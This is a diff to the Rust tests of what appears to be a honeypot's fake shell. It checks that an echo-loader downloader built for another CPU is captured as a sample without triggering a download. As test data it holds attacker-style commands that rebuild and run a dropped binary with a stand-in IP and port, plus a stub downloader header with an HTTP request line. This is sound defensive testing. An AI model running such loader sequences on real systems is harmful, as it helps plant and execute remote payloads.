@@ -928,8 +928,10 @@ mod tests {
         );
     }
 
-    /// A downloader as an echo loader sends it: ELF magic, bytes past 0x7f, a request line.
-    const DOWNLOADER: &[u8] = b"\x7fELF\x02\x01\x01\0\xff\x80\x0a\0GET /s2.bin HTTP/1.1\r\n\0";
+    /// A downloader as an echo loader sends it: an x86_64 ELF header (class, byte order and
+    /// `e_machine` are what the persona's exec decision reads), bytes past 0x7f, a request line.
+    const DOWNLOADER: &[u8] =
+        b"\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0\x02\0\x3e\0\xff\x80\x0a\0GET /s2.bin HTTP/1.1\r\n\0";
 
     fn loader_shell(captures: &StdinCaptures) -> FakeShell {
         let mut shell = FakeShell::new(FakeFs::new(), ctx()).with_captures(captures.clone());
@@ -989,6 +991,44 @@ mod tests {
                 .map(|b| format!("{b:02x}"))
                 .collect::<String>()
         );
+    }
+
+    /// A downloader built for another CPU does not start on this box, so it fetches nothing and
+    /// derives no URL, but the bytes the attacker sent are the sample all the same, taken when it
+    /// was run rather than when the session ended.
+    #[tokio::test]
+    async fn a_downloader_for_another_cpu_is_captured_when_run_and_derives_nothing() {
+        let dir = tempfile::tempdir().unwrap();
+        let handoff = handoff(dir.path());
+        let captures = StdinCaptures::new(handoff.clone(), source());
+        let mut shell = loader_shell(&captures);
+        let mut arm = DOWNLOADER.to_vec();
+        // e_machine 40 (ARM), little-endian, in the header's machine field.
+        arm[18] = 40;
+        arm[19] = 0;
+        let chunks = upload_chunks(&mut shell, ".i", &arm);
+        shell.handle_input("cp /bin/ls .j && cat .i>.j &&rm .i && cp .j .i &&rm .j");
+        let (out, line_events) = shell.handle_input("./.i 203 0 113 9 8080");
+        assert_eq!(
+            out,
+            "-bash: ./.i: cannot execute binary file: Exec format error\n"
+        );
+        assert_eq!(out.status, 126);
+        assert!(
+            line_events
+                .iter()
+                .all(|e| e.signal_type != sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD),
+            "{line_events:?}"
+        );
+        drop(shell);
+        drop(captures);
+        handoff.drain(std::time::Duration::from_secs(5)).await;
+        let events = events(dir.path());
+        assert_eq!(events.len(), 1, "{events:?}");
+        let meta = &events[0]["metadata"];
+        assert_eq!(meta["capture_reason"], "echo_loader");
+        assert_eq!(meta["chunk_count"], chunks);
+        assert_eq!(meta["end_reason"], "transfer_complete");
     }
 
     /// An assembly the session never ran is taken as the session leaves it; a single `echo > f`
